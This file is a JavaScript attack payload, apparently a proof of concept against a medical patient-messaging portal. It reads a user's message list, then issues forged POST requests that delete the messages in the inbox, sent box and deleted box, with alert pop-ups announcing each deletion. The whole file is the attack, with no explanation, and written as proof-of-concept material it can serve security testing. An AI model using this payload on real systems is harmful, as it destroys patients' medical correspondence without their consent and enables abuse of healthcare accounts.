var req = new XMLHttpRequest();
var req2 = new XMLHttpRequest();
var req3 = new XMLHttpRequest();
var req4 = new XMLHttpRequest();

req.onreadystatechange = function()
{
if (req.readyState == 4 && req.status == 200 )
  {
 reponse_obj = JSON.parse(req.responseText);
 for (var i = 0; i < reponse_obj.rows.length; i++) {
    var row = reponse_obj.rows[i];
    console.log(row.id);
    alert("Deleting Inbox");
    req2.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=0&msgid="+row.id+"&nact=1", true);
    req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req2.send();
 }
 for (var i = 0; i < reponse_obj.rows.length; i++) {
    var row = reponse_obj.rows[i];
    console.log(row.id);
    alert("Deleting SentBox");
    req3.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=1&msgid="+row.id+"&nact=1", true);
    req3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req3.send();
 }
 for (var i = 0; i < reponse_obj.rows.length; i++) {
    var row = reponse_obj.rows[i];
    console.log(row.id);
    alert("Deleting DeleteBox");
    req4.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&msgid="+row.id+"&nact=1", true);
    req4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req4.send();
     }
   }
};

req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messageJson.jsp?uid=9135&type=0&tab=3&rows=20&page=1");
req.send();
